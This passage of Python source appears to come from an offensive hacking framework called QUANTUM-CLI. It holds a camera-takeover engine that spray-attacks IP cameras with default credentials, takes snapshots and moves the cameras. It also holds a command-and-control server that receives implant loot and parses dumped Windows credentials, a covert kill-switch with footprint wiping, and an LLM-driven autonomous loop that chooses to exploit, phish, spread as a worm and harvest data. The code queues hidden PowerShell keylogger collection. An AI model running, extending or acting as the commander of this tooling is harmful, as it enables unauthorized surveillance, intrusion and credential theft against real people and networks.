    def control_camera(self, ip, user="admin", pwd="admin"):
        cam = {"ip": ip, "vendor": CAMWAR.identify(ip).get("vendor")}
        return CAMWAR.one_shot(ip)

# ============================================================================
# 11b. DISCOVERY HELPERS — WS-Discovery ONVIF Probe + ONVIF device info
# ============================================================================
def wsdiscovery_cameras(timeout=5.0):
    probe = (
        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
        'xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
        'xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" '
        'xmlns:dn="http://www.onvif.org/ver10/network/wsdl">'
        '<s:Header>'
        '<a:MessageID>urn:uuid:' + str(uuid.uuid4()) + '</a:MessageID>'
        '<a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>'
        '<a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</a:Action>'
        '</s:Header>'
        '<s:Body><d:Probe>'
        '<d:Types>dn:NetworkVideoTransmitter tds:Device</d:Types>'
        '<d:Scopes/>'
        '</d:Probe></s:Body></s:Envelope>'
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except OSError:
        pass
    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
    except OSError:
        pass
    s.settimeout(0.5)
    try:
        s.bind(("", 0))
    except OSError:
        pass
    try:
        s.sendto(probe.encode(), ("239.255.255.250", 3702))
    except OSError as e:
        log(f"WS-Discovery send failed: {e}", "CAM")
        s.close()
        return []
    found, end = {}, time.time() + timeout
    while time.time() < end:
        try:
            data, addr = s.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            txt = data.decode("utf-8", "ignore")
        except Exception:
            continue
        if "ProbeMatch" not in txt and "Types" not in txt:
            continue
        ip, port = None, 80
        xaddr = re.search(r':XAddrs>\s*([^<\s]+)', txt)
        if xaddr:
            try:
                from urllib.parse import urlparse
                u = urlparse(xaddr.group(1))
                if u.hostname:
                    ip, port = u.hostname, u.port or 80
            except Exception:
                pass
        if ip is None:
            ip = addr[0]          # device answered without XAddrs — sender IP is it
        ip = str(ip)
        rec = found.setdefault(ip, {"ip": ip, "onvif_port": port,
                                    "manufacturer": None, "model": None,
                                    "name": None, "ws": True})
        for attr, pat in (("manufacturer", r'onvif\.org/hardware/([^"\'<\s]+)'),
                          ("model",       r'onvif\.org/model/([^"\'<\s]+)'),
                          ("name",        r'onvif\.org/name/([^"\'<\s]+)')):
            m = re.search(pat, txt)
            if m and not rec.get(attr):
                rec[attr] = m.group(1)
        if re.search(r'onvif\.org/Profile/(Streaming|S|T|G)', txt):
            rec["onvif"] = True
    s.close()
    if found:
        log(f"WS-Discovery: {len(found)} ONVIF devices answered", "CAM")
    return list(found.values())

def onvif_device_info(ip, port=80):
    body = ('<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
            '<s:Body><GetDeviceInformation '
            'xmlns="http://www.onvif.org/ver10/device/wsdl"/>'
            '</s:Body></s:Envelope>')
    try:
        r = requests.post(f"http://{ip}:{port}/onvif/device_service", data=body,
                          headers={"Content-Type": "application/soap+xml; charset=utf-8"},
                          timeout=5)
        out = {}
        for k in ("Manufacturer", "Model", "FirmwareVersion", "SerialNumber"):
            m = re.search(k + r">([^<]+)", r.text)
            if m: out[k.lower()] = m.group(1)
        return out if out else None
    except Exception:
        return None

# ============================================================================
# 11c. CAMWAR — CAMERA WARFARE ENGINE (V2.2 lineage, V3 carrier)
# ============================================================================
class CamWarEngine:
    CAM_PORTS = [80, 443, 554, 37777, 37778, 8000, 8001, 8080, 8081, 8899,
                 34567, 34571, 34599, 5000]
    VENDOR_HINTS = [
        ("hikvision", ("hikvision", "webcomponents", "doc/page/login", "www-uc",
                       "embedded_net_dvr", "netdvr", "hik-")),
        ("dahua",     ("dahua", "login_module.js", "netkeyboard", "dvrdvs", "dss")),
        ("axis",      ("axis", "axis-cgi")),
        ("foscam",    ("foscam", "cgi-bin/hi3510", "get_params.cgi", "ipcam")),
        ("tplink",    ("tapo", "tplink")),
        ("generic",   ("ipcamera", "netcam", "webcam", "rtsp")),
    ]
    RTSP_VENDORS = [
        ("hikvision", ("embedded_net_dvr", "netdvr", "hikvision", "hik-")),
        ("dahua",     ("dahua", "dvrdvs", "dss")),
        ("vivotek",   ("vivotek",)),
        ("axis",      ("axis",)),
        ("foscam",    ("ipcamera", "foscam")),
        ("tplink",    ("tapo",)),
    ]
    CREDS = {
        "hikvision": [("admin", "admin"), ("admin", "12345"), ("admin", "888888"),
                     ("admin", "66668888"), ("admin", "Admin123"), ("admin", "")],
        "dahua":     [("admin", "admin"), ("admin", "admin1234"), ("888888", "888888"), ("admin", "123456")],
        "axis":      [("root", "pass"), ("root", "root"), ("admin", "1234"), ("admin", "admin")],
        "foscam":    [("admin", ""), ("admin", "admin"), ("admin", "12345"), ("admin", "888888")],
        "tplink":    [("admin", "admin"), ("admin", "password")],
        "generic":   [("admin", "admin"), ("admin", "12345"), ("admin", ""), ("root", "root"),
                      ("user", "user"), ("guest", "guest"), ("888888", "888888")],
    }
    INFO_ENDPOINTS = {
        "hikvision": ("/ISAPI/System/deviceInfo", "digest"),
        "dahua":     ("/cgi-bin/magicBox.cgi?action=getSystemInfo", "digest"),
        "axis":      ("/axis-cgi/param.cgi?action=list", "basic"),
        "foscam":    ("/get_params.cgi", "basic"),
        "generic":    ("/", "basic"),
    }
    SNAPSHOT = {
        "hikvision": [("/ISAPI/Streaming/channels/101/picture", "digest"),
                      ("/ISAPI/Streaming/channels/1/picture", "digest"),
                      ("/ISAPI/System/Video/inputs/channels/1/picture", "digest")],
        "dahua":     [("/cgi-bin/snapshot.cgi", "digest"),
                      ("/cgi-bin/snapshot.cgi?channel=1", "digest")],
        "axis":      [("/axis-cgi/jpg/image.cgi?resolution=640x480", "basic")],
        "foscam":    [("/snapshot.cgi", "basic")],
        "generic":   [],
    }
    GENERIC_SNAPSHOTS = [
        ("/snapshot.cgi", "basic"), ("/image.jpg", "basic"),
        ("/snap.jpg", "basic"), ("/snapshot.jpg", "basic"),
        ("/onvif-http/snapshot.jpg", "basic"),
        ("/cgi-bin/snapshot.cgi", "digest"),
        ("/ISAPI/Streaming/channels/101/picture", "digest"),
        ("/tmpfs/snap.jpg", "basic"),
        ("/webcapture.jpg?command=snap&channel=1", "basic"),
    ]
    PTZ = {
        "hikvision": ("put", "/ISAPI/PTZCtrl/channels/1/continuous",
                      '<PTZData><pan>60</pan><tilt>0</tilt></PTZData>', "digest"),
        "dahua":     ("get", "/cgi-bin/ptz.cgi?action=start&code=LeftRight&arg1=1&arg2=1&channel=1", None, "digest"),
        "axis":      ("get", "/axis-cgi/com/ptz.cgi?move=up", None, "basic"),
        "foscam":    ("get", "/decoder_control.cgi?command=2", None, "basic"),
    }

    @classmethod
    def _auth(cls, kind, u, p):
        return HTTPDigestAuth(u, p) if kind == "digest" else HTTPBasicAuth(u, p)

    @staticmethod
    def _rtsp_probe(ip, port=554, timeout=3):
        try:
            s = socket.create_connection((ip, port), timeout=timeout)
            s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n"
                      "User-Agent: QCLI\r\n\r\n".encode())
            data = s.recv(512); s.close()
            return data.decode("latin-1", "ignore")
        except Exception:
            return ""

    @classmethod
    def _rtsp_alive(cls, ip, port=554, timeout=3):
        return "RTSP" in cls._rtsp_probe(ip, port, timeout)

    @classmethod
    def _vendor_from_rtsp(cls, raw):
        low = raw.lower()
        for vendor, hints in cls.RTSP_VENDORS:
            if any(h in low for h in hints):
                return vendor
        return None

    @staticmethod
    def _vendor_from_str(s):
        low = (s or "").lower()
        if "hik" in low: return "hikvision"
        if "dahua" in low: return "dahua"
        if "axis" in low: return "axis"
        if "foscam" in low: return "foscam"
        if "tapo" in low or "tplink" in low: return "tplink"
        return None

    def identify(self, ip):
        info = {"ip": ip, "vendor": None, "rtsp": False, "ports": []}
        vol = None
        for port in self.CAM_PORTS:
            if tcp_probe(ip, port, timeout=0.8):
                info["ports"].append(port)
                if port in (80, 8080, 8000, 8081, 443, 5000) and vol is None:
                    try:
                        scheme = "https" if port == 443 else "http"
                        r = requests.get(f"{scheme}://{ip}:{port}", timeout=3, verify=False)
                        hay = (r.text or "").lower() + " " + (
                            r.headers.get("Server", "") + " " + r.headers.get("WWW-Authenticate", "")).lower()
                        if not any(h in hay for h in ("embedded_net_dvr", "netdvr")):
                            try:
                                r2 = requests.get(f"{scheme}://{ip}:{port}/doc/page/login.asp",
                                                  timeout=3, verify=False)
                                hay += " " + (r2.text or "").lower()[:4000]
                            except Exception:
                                pass
                        for vendor, hints in self.VENDOR_HINTS:
                            if any(h in hay for h in hints):
                                info["vendor"] = vendor; vol = port; break
                        if port == 443: info["scheme"] = "https"
                    except Exception:
                        pass
        if tcp_probe(ip, 554, timeout=1.0):
            raw = self._rtsp_probe(ip)
            if "RTSP" in raw:
                info["rtsp"] = True
            if info["vendor"] is None:
                got = self._vendor_from_rtsp(raw)
                if got:
                    info["vendor"] = got
                    log(f"CAM WAR: {ip} vendor={got} via RTSP Server header", "CAM")
        if info["vendor"] is None and info["rtsp"]:
            info["vendor"] = "generic"
        return info

    def discover(self, cidr):
        import ipaddress
        cameras, checked = [], 0
        try:
            hosts = [str(i) for i in ipaddress.ip_network(cidr, strict=False).hosts()]
        except Exception as e:
            log(f"CAMWAR bad CIDR {cidr}: {e}", "ERR"); return []
        log(f"CAM WAR: sweeping {len(hosts)} hosts in {cidr} for cameras (TCP + WS-Discovery)…", "CAM")

        ws = wsdiscovery_cameras(timeout=4.0)
        wsmap = {w["ip"]: w for w in ws}

        def merge_ws(info, w):
            info["onvif"] = True
            if w.get("onvif_port") and w["onvif_port"] not in info["ports"]:
                info["ports"].append(w["onvif_port"])
            if info["vendor"] is None and w.get("manufacturer"):
                info["vendor"] = self._vendor_from_str(w["manufacturer"]) or "generic"
            if w.get("model"): info["model"] = w["model"]
            if w.get("name"): info["name"] = w["name"]
            return info

        lock = threading.Lock()
        def work(ip):
            nonlocal checked
            info = self.identify(ip)
            w = wsmap.get(ip)
            if w:
                info = merge_ws(info, w)
                if info["vendor"] is None and info["rtsp"]:
                    info["vendor"] = "generic"
            with lock:
                checked += 1
                if info["vendor"] or info["rtsp"] or 554 in info["ports"] or w is not None:
                    cameras.append(info)
                    log(f"CAM WAR: camera candidate {ip} vendor={info['vendor']} "
                        f"rtsp={info['rtsp']} ports={info['ports']}"
                        + (f" model={info.get('model')}" if info.get("model") else ""), "CAM")
        with ThreadPoolExecutor(max_workers=64) as ex:
            list(ex.map(work, hosts))

        hostset = set(hosts)
        for w in ws:
            if w["ip"] not in hostset:
                info = merge_ws(self.identify(w["ip"]), w)
                if info["vendor"] or info["rtsp"] or 554 in info["ports"]:
                    cameras.append(info)
                    log(f"CAM WAR: (out-of-scope via WS) camera {w['ip']} "
                        f"vendor={info['vendor']} model={info.get('model')}", "CAM")

        for cam in cameras:
            if not (cam.get("model") or cam.get("onvif_port")):
                continue
            for p in (cam.get("onvif_port"), 80, 8000, 8080):
                if p and tcp_probe(cam["ip"], p, timeout=0.8):
                    dbg = onvif_device_info(cam["ip"], p)
                    if dbg: break
        log(f"CAM WAR: discovery done — {checked} hosts checked + {len(ws)} WS-Discovery hits, "
            f"{len(cameras)} cameras found", "CAM")
        return cameras

    def attack_cam(self, cam):
        vendor = cam.get("vendor") or "generic"
        scheme = cam.get("scheme") or ("https" if 443 in cam.get("ports", []) else "http")
        base = f"{scheme}://{cam['ip']}"
        info_path, authkind = self.INFO_ENDPOINTS.get(vendor, self.INFO_ENDPOINTS["generic"])
        for user, pwd in self.CREDS.get(vendor, self.CREDS["generic"]):
            try:
                r = requests.get(base + info_path, auth=self._auth(authkind, user, pwd), timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 0:
                    cam["user"], cam["pwd"], cam["controlled"] = user, pwd, True
                    log(f"CAM WAR: {cam['ip']} ({vendor}) CRACKED with {user}:{pwd or '<blank>'}", "CAM")
                    return (user, pwd)
                for alt in ("/doc/page/login.asp", "/onvif/device_service"):
                    try:
                        r2 = requests.get(base + alt, auth=self._auth(authkind, user, pwd), timeout=5, verify=False)
                        if r2.status_code in (200, 400, 405) and user != "guest":
                            cam["user"], cam["pwd"], cam["controlled"] = user, pwd, True
                            log(f"CAM WAR: {cam['ip']} ({vendor}) CRACKED via {alt} with {user}:{pwd or '<blank>'}", "CAM")
                            return (user, pwd)
                    except Exception:
                        continue
            except Exception:
                continue
        cam["controlled"] = False
        log(f"CAM WAR: {cam['ip']} ({vendor}) resisted default creds", "CAM")
        return None

    def control_cam(self, cam, ptz=True):
        if not cam.get("controlled"): return None
        vendor = cam.get("vendor") or "generic"
        scheme = cam.get("scheme") or "http"
        base = f"{scheme}://{cam['ip']}"
        candidates = list(self.SNAPSHOT.get(vendor, []))
        for v in ("hikvision", "dahua", "axis", "foscam"):
            if v != vendor:
                candidates += self.SNAPSHOT[v]
        candidates += self.GENERIC_SNAPSHOTS
        shots = []
        for path, kind in candidates:
            try:
                r = requests.get(base + path, auth=self._auth(kind, cam["user"], cam["pwd"]),
                                 timeout=8, verify=False)
                if r.status_code == 200 and r.content[:2] in (b"\xff\xd8", b"\x89PNG"):
                    fn = os.path.join(LOOT_DIR, f"cam_{cam['ip']}_{int(time.time())}.jpg")
                    open(fn, "wb").write(r.content)
                    sealed = GRAYFISH.seal(fn)
                    shots.append(sealed)
                    log(f"CAM WAR: snapshot exfil {cam['ip']} -> {sealed}", "CAM")
                    break
            except Exception:
                continue
        if ptz and vendor in self.PTZ:
            method, path, body, kind = self.PTZ[vendor]
            try:
                if method == "put":
                    requests.put(base + path, data=body,
                                 auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
                    time.sleep(1.0)
                    requests.put(base + path, data='<PTZData><pan>0</pan><tilt>0</tilt></PTZData>',
                                 auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
                else:
                    requests.get(base + path, auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
                cam["ptz"] = "nudged"
                log(f"CAM WAR: PTZ nudged on {cam['ip']}", "CAM")
            except Exception as e:
                log(f"CAM WAR: PTZ {cam['ip']}: {e}", "WARN")
        cam["snapshots"] = shots
        return shots

    def one_shot(self, ip, ptz=True):
        cam = self.identify(ip)
        if not cam["vendor"] and not cam["rtsp"]:
            for w in wsdiscovery_cameras(timeout=3.0):
                if w["ip"] == ip:
                    if w.get("manufacturer"):
                        cam["vendor"] = self._vendor_from_str(w["manufacturer"]) or "generic"
                    cam["onvif"] = True
                    break
        if not cam["vendor"] and not cam["rtsp"] and not cam.get("onvif"):
            return {"ip": ip, "camera": False}
        if cam["vendor"] is None: cam["vendor"] = "generic"
        self.attack_cam(cam)
        self.control_cam(cam, ptz=ptz)
        return cam

    def pwn_network(self, cidr, report=True):
        log(f"CAM WAR: ENGAGING full takeover on {cidr}", "CAM")
        cams = self.discover(cidr)
        cracked, snapshots = 0, 0
        for cam in cams:
            if self.attack_cam(cam):
                cracked += 1
                snaps = self.control_cam(cam) or []
                snapshots += len(snaps)
            time.sleep(random.uniform(0.3, 1.5))
        summary = {"cidr": cidr, "found": len(cams), "cracked": cracked,
                   "snapshots": snapshots,
                   "cams": [{"ip": c["ip"], "vendor": c["vendor"], "rtsp": c["rtsp"],
                             "model": c.get("model"), "controlled": c.get("controlled", False)} for c in cams]}
        if report:
            fn = os.path.join(LOOT_DIR, f"camwar_{cidr.replace('/', '_')}_{int(time.time())}.json")
            open(fn, "w").write(json.dumps(summary, indent=2))
            GRAYFISH.seal(fn)
        log(f"CAM WAR: {cidr} dominated — {len(cams)} found, {cracked} cracked, "
            f"{snapshots} snapshots exfiltrated", "CAM")
        return summary

# ============================================================================
# 12. C2 CORE — V3.1: production WSGI, kill-switch route, post-exploit stage
# ============================================================================
def keygen(force=False):
    if os.path.exists(PRIV) and not force:
        log("keys exist (use keygen --force)", "WARN"); return
    k = RSA.generate(2048)
    open(PRIV, "wb").write(k.export_key())
    xml = ("<RSAKeyValue><Modulus>%s</Modulus><Exponent>%s</Exponent></RSAKeyValue>"
           % (base64.b64encode(k.n.to_bytes((k.n.bit_length()+7)//8, "big")).decode(),
              base64.b64encode(k.e.to_bytes(3, "big")).decode()))
    open(PUB, "w").write(xml)
    log(f"generated {PRIV} + {PUB}", "OK")

def decrypt_beacon(d):
    priv = RSA.import_key(open(PRIV, "rb").read())
    key = PKCS1_OAEP.new(priv).decrypt(bytes.fromhex(d["k"]))
    raw = AES.new(key, AES.MODE_CBC, iv=b"\x00"*16).decrypt(base64.b64decode(d["data"]))
    return gzip.decompress(raw[:-raw[-1]])

def auto_parse_loot(host, zipfn):
    try:
        import pypykatz.pypykatz as pk
        if zipfile.is_zipfile(zipfn):
            with zipfile.ZipFile(zipfn) as z:
                for n in z.namelist():
                    if n.endswith(".dmp"):
                        tmp = os.path.join(LOG_DIR, f"_{host}_{n}")
                        open(tmp, "wb").write(z.read(n))
                        try:
                            m = pk.get_file_secrets(tmp, packages=["msv", "wdigest", "tspkg", "kerberos"])
                            creds = [f"{s['username']}:{s['password']}"
                                     for pkg in m.values() for s in pkg["cred"] if s.get("password")]
                            out = os.path.join(LOOT_DIR, host, "parsed.txt")
                            os.makedirs(os.path.dirname(out), exist_ok=True)
                            open(out, "a").write("\n".join(creds) + "\n")
                            log(f"auto-parse: {len(creds)} creds from {host}/{n}", "OK")
                            GRAYFISH.seal(out)
                        finally: os.unlink(tmp)
    except ImportError:
        log("pypykatz missing — auto-parse disabled", "INFO")
    except Exception as e:
        log(f"auto-parse: {e}", "WARN")

def run_c2(app, host="0.0.0.0", port=8443):
    """V3 production WSGI: waitress (all OS) -> gunicorn (POSIX) -> Flask dev
    server as last resort only."""
    try:
        import waitress
        log(f"C2 served by WAITRESS (production WSGI) on {host}:{port}", "C2")
        waitress.serve(app, host=host, port=port, threads=16, channel_timeout=30)
        return
    except ImportError:
        pass
    try:
        import gunicorn.app.base
        class Standalone(gunicorn.app.base.BaseApplication):
            def load_config(self):
                self.cfg.set("bind", f"{host}:{port}")
                self.cfg.set("workers", 4)
            def load(self): return app
        log(f"C2 served by GUNICORN (production WSGI) on {host}:{port}", "C2")
        Standalone().run(); return
    except ImportError:
        log("waitress/gunicorn missing — falling back to Flask dev server "
            "(NOT production-recommended; pip install waitress)", "WARN")
    app.run(host=host, port=port, threaded=True)

TURBINE = None

def make_c2(agents: dict):
    global TURBINE
    API = QCLI_API()
    TURBINE = Turbine()
    API.turbine = TURBINE
    app = Flask(__name__)

    @app.route("/s", defaults={"profile": "default"})
    @app.route("/s/<profile>")
    def s(profile):
        agent_text = agents.get(profile)
        if not agent_text: return "unknown profile", 404
        return agent_text, 200, {"Content-Type": "text/plain"}

    @app.route("/r", methods=["POST"])
    def r():
        d = request.json or {}
        host = d.get("host", "?")
        task, TASKQ[host] = TASKQ.get(host, {}), {}
        if d.get("data") and not d.get("k"):
            os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
            fn = os.path.join(LOOT_DIR, host, f"posix_drop_{int(time.time())}.txt")
            try: open(fn, "wb").write(base64.b64decode(d["data"]))
            except Exception: open(fn, "w").write(str(d["data"]))
            GRAYFISH.seal(fn)
            log(f"C2 posix loot {host} -> {fn}.gfy", "C2")
            return jsonify(task or {"act": "none"})
        if d.get("act") == "hb":
            # V3.1: keylogger buffer pull is automatic — if a kl.klq arrives, seal it
            log(f"C2 hb {host}; reply {task or 'none'}", "C2")
            threading.Thread(target=TURBINE.enroll, args=(host, {"heartbeat": True}), daemon=True).start()
            return jsonify(task or {"act": "none"})
        try: blob = decrypt_beacon(d)
        except Exception as e:
            log(f"decrypt fail {host}: {e}", "ERR"); return jsonify({"act": "none"})
        os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
        fn = os.path.join(LOOT_DIR, host, f"drop_{int(time.time())}.zip")
        open(fn, "wb").write(blob)
        log(f"C2 loot {host}: {len(blob)} bytes", "C2")
        auto_parse_loot(host, fn)
        GRAYFISH.seal(fn)
        return jsonify(task or {"act": "none"})

    @app.route("/ai", methods=["POST"])
    def ai_api():
        d = request.json or {}
        return jsonify(API.handle(d.get("cmd", ""), d.get("params", {})))

    @app.route("/kill", methods=["POST"])
    def kill_switch():
        """V3.1: covert kill-switch — sets wipe/die tasks on every implant queue
        (delivery rides each implant's own encrypted beacon pull)."""
        arm = (request.json or {}).get("arm", True)
        if arm:
            return jsonify(kill_all_implants(wipe_first=(request.json or {}).get("wipe", True)))
        KILLSWITCH["on"] = False
        return jsonify({"killed": [], "note": "kill-switch disarmed"})

    @app.route("/federation/reg", methods=["GET", "POST"])
    def fed_reg():
        if request.method == "POST":
            remote = (request.json or {}).get("implants", {})
            with TURBINE.lock:
                for h, rec in remote.items():
                    if h not in TURBINE.implants: TURBINE.implants[h] = rec
        return jsonify({"implants": TURBINE.implants, "onion": FEDERATION.onion})

    @app.route("/federation/peer", methods=["POST"])
    def fed_peer():
        onion = (request.json or {}).get("onion")
        if onion and onion not in FEDERATION.peers:
            FEDERATION.peers.append(onion)
            open(os.path.join(LOG_DIR, "federation", "peers.json"), "w").write(json.dumps(FEDERATION.peers))
            log(f"FEDERATION: new peer {onion}", "FED")
        return jsonify({"peers": FEDERATION.peers})

    @app.route("/dash")
    def dash():
        return Response(DASH_HTML, mimetype="text/html")

    @app.route("/dash/api/state")
    def dash_state():
        return jsonify({
            "decisions": _tail_jsonl(os.path.join(LOG_DIR, "decisions.jsonl"), 100),
            "audit":     _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 200),
            "mitre":     MitreMapper().map_audit().get("coverage", []),
            "killswitch": KILLSWITCH["on"],
        })

    log("QUANTUMDASH live at http://0.0.0.0:8443/dash", "DASH")
    return app

# ============================ GLOBAL WIRING ================================
VALIDATOR = Validator()
GODSUPREME = GodSupreme()
CAMWAR = CamWarEngine()

# ============================================================================
# 13. AUTONOMOUS OVERLORD (CAMERA-FIRST; V3.1 kill-switch aware)
# ============================================================================
class AutonomousOverlord:
    ACTIONS = ["cam_war", "cam_discover", "cam_control", "recon_scope", "exploit",
               "brute", "phish", "worm", "harvest", "router", "osint",
               "episcribe", "mitre_report", "rest"]

    def __init__(self, scope=None, cycles=0, aggression="balanced", camera_only=False):
        self.scope = scope or local_scope()
        self.aggression = aggression
        self.camera_only = camera_only
        self.ai = AI_Supervisor()
        self.recon = ReconModule()
        self.weapons = ExploitOrchestrator()
        self.brute = BruteEngineV3()
        self.phish = PhishEngine()
        self.harvest = DataHarvester()
        self.epi = EpiScribe()
        self.ud = UnitedDrake()
        self.camwar = CAMWAR
        self.cycles = cycles
        self.state = {"targets": [], "fired": [], "creds": [], "cams": []}
        self.stop = threading.Event()

    def _decide(self):
        acts = self.ACTIONS if not self.camera_only else \
               ["cam_war", "cam_discover", "cam_control", "mitre_report", "rest"]
        budget = json.dumps(self.state, default=str)[:2000]
        p = (f"You are running an authorized red-team engagement (aggression: {self.aggression}). "
             f"Scope: {self.scope}. Cameras are the PRIMARY objective. "
             f"Campaign state so far: {budget}. Choose the single next action from this list ONLY: {acts}. "
             "Reply as strict JSON: {\"action\": \"...\", \"target\": \"ip-or-domain-or-blank\", "
             "\"reason\": \"one sentence\"}.")
        d = None
        if not AI_Supervisor.ai_dead and not no_ai_mode():
            raw = self.ai.query_bounded(p, timeout=120,
                                        system="You are an autonomous red-team commander obsessed with cameras. Output JSON only.")
            if raw:
                clean = re.sub(r"```(?:json)?", "", raw, flags=re.I).strip()
                m = re.search(r"\{.*\}", clean, re.S)
                if m:
                    try:
                        d = json.loads(m.group())
                    except Exception as je:
                        log(f"_decide JSON fail ({je}); raw reply: {raw[:200]!r}", "AI")
                else:
                    log(f"_decide no JSON object in reply: {raw[:200]!r}", "AI")
        if not isinstance(d, dict) or d.get("action") not in acts:
            d = QBrain.decide(self.state, acts, self.camera_only)
            if d.get("action") not in acts:   # paranoia: QBrain must obey the whitelist
                d = {"action": "rest", "target": "", "reason": "fallback"}
        with open(os.path.join(LOG_DIR, "decisions.jsonl"), "a") as f:
            f.write(json.dumps({"ts": datetime.now().isoformat(), **d}) + "\n")
        return d

    def post_exploit_auto(self):
        """V3.1: runs after successful exploitation — stealth persistence stage
        (PERSISTX), keylogger staging (KITLOGGER task in queue, delivered on
        next beacon) and secure exfil prep (GRAYFISH interior files)."""
        hits = persistx()
        stage_keylogger()
        for t in self.state["fired"]:
            TASKQ.setdefault(t, {}).update({"act": "run", "cmd":
                "powershell -w hidden -c Get-ChildItem $env:TEMP\\ -Filter *.klq | "
                "%% { [IO.File]::ReadAllBytes($_.FullName) }"})
        log(f"POST-EXPLOIT auto-stage: persist={hits} keylogger=queued "
            f"targets={len(self.state['fired'])}", "C2")

    def _execute(self, d):
        act, tgt = d.get("action"), d.get("target", "")
        log(f"AUTO decision: {act} target={tgt or '-'} ({d.get('reason')})", "AUTO")
        if act == "cam_war" or act == "cam_discover":
            cidr = tgt if "/" in (tgt or "") else self.scope
            res = self.camwar.pwn_network(cidr) if act == "cam_war" else \
                  {"cams": self.camwar.discover(cidr)}
            self.state["cams"] += res.get("cams", [])
        elif act == "cam_control":
            for c in self.state["cams"] or []:
                if c.get("controlled"):
                    self.camwar.control_cam(c)
                else:
                    self.camwar.attack_cam(c)
        elif act == "recon_scope":
            self.state["targets"] = list(self.recon.scan(self.scope).keys())
        elif act == "exploit" and tgt:
            r = self.weapons.auto_exploit(tgt, force=(self.aggression == "aggressive"))
            if not r.get("skipped"):
                self.state["fired"].append(tgt)
                self.post_exploit_auto()
        elif act == "brute" and tgt:
            self.state["creds"] += self.brute.run({"ip": tgt, "osint": self.state.get("osint", "")})
        elif act == "phish" and tgt:
            self.phish.launch({"target_email": tgt})
        elif act == "worm" and tgt:
            threading.Thread(target=GODSUPREME.hop_from, args=(tgt,), daemon=True).start()
        elif act == "harvest":
            for h in self.state["fired"] or [tgt]:
                if h: self.harvest.harvest_host(h)
        elif act == "router" and tgt:
            self.ud.attack_router(tgt)
        elif act == "osint" and tgt:
            self.recon.osint(tgt)
        elif act == "episcribe" and tgt:
            self.epi.add_selector(tgt); self.epi.watch(duration=60)
        elif act == "mitre_report" or act == "rest":
            pass
        time.sleep(network_aware_jitter(15))

    def run(self):
        log(f"AUTONOMOUS DOMINION: scope {self.scope}, aggression {self.aggression}, "
            f"camera_only={self.camera_only}, CAMERAS ARE THE PRIMARY OBJECTIVE "
            f"(AI={'QBrain fallback' if (AI_Supervisor.ai_dead or no_ai_mode()) else 'online/local'})", "AUTO")
        if not os.path.exists(PRIV): keygen()
        agents = {"default": (open(AGENT).read() if os.path.exists(AGENT) else "# agent file missing"),
                  "linux":   (open(generate_posix_agent(local_ip())).read()),
                  "mac":     (open(os.path.join(QCLI_DIR, "ghostfang.sh")).read())}
        threading.Thread(target=lambda: run_c2(make_c2(agents)), daemon=True).start()
        n = 0
        try:
            self.state["cams"] = self.camwar.pwn_network(self.scope).get("cams", [])
            while not self.stop.is_set():
                if KILLSWITCH["on"]:
                    log("AUTONOMOUS: kill-switch engaged — retiring & sealing", "AUTO"); break
                n += 1
                self._execute(self._decide())
                if self.cycles and n >= self.cycles:
                    log(f"AUTONOMOUS: cycle budget ({self.cycles}) reached", "AUTO"); break
        except KeyboardInterrupt:
            log("AUTONOMOUS: operator interrupt — sealing loot", "AUTO")
        except Exception as e:
            log(f"AUTONOMOUS fatal: {e}", "ERR")
        finally:
            if KILLSWITCH["on"]:
                footprint_wipe_windows() if os.name == "nt" else footprint_wipe_posix()
            GRAYFISH.seal_dir()
            MitreMapper().map_audit()
            log(f"AUTONOMOUS: paused after {n} cycles — {len(self.state['cams'])} cameras touched, "
                f"{len(self.state['fired'])} fired, {len(self.state['creds'])} creds", "AUTO")

# ============================================================================
# 14. MANUAL MODES
# ============================================================================
def camera_console(cidr):
    """Manual camera war console. Zero AI required."""
    cw = CAMWAR
    cams = []
    while True:
        print(f"\n{Fore.LIGHTRED_EX}=== QUANTUM-CLI CAMERA CONSOLE — {cidr} ==={Fore.RESET}")
        print(" 1. Discover cameras (TCP + WS-Discovery)   2. Attack all (cred spray)")
        print(" 3. Snapshot all cracked                       4. PTZ nudge all cracked")
        print(" 5. Attack+snapshot+PTZ single IP              6. One-shot single IP (auto)")
        print(" 7. List state                                 0. Back")
        try: c = input("camwar> ").strip()
        except (EOFError, KeyboardInterrupt): return
        if c == "0": return
        if c == "1": cams = cw.discover(cidr)
        elif c == "2":
            for cam in cams: cw.attack_cam(cam)
        elif c == "3":
            for cam in cams:
                if cam.get("controlled"): cw.control_cam(cam, ptz=False)
        elif c == "4":
            for cam in cams:
                if cam.get("controlled"): cw.control_cam(cam, ptz=True)
        elif c == "5":
            cam = cw.identify(input("IP: ").strip())
            if cam["vendor"] or cam["rtsp"]:
                if cam["vendor"] is None: cam["vendor"] = "generic"
                cw.attack_cam(cam); cw.control_cam(cam, ptz=True)
        elif c == "6":
            print(json.dumps(cw.one_shot(input("IP: ").strip()), indent=2, default=str))
        elif c == "7":
            print(json.dumps(cams, indent=2, default=str))

def menu():
    while True:
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║  QUANTUM-CLI FINAL V3.1 — MANUAL CONSOLE (CAMERA-FIRST OPS)   ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
  {Fore.GREEN}CAMERAS{Fore.RESET}
   c. Camera console          11. Discover+control cameras (CIDR)
  {Fore.GREEN}RECON / OSINT{Fore.RESET}   1. Scan CIDR   2. Fingerprint   3. OSINT   4. Validate
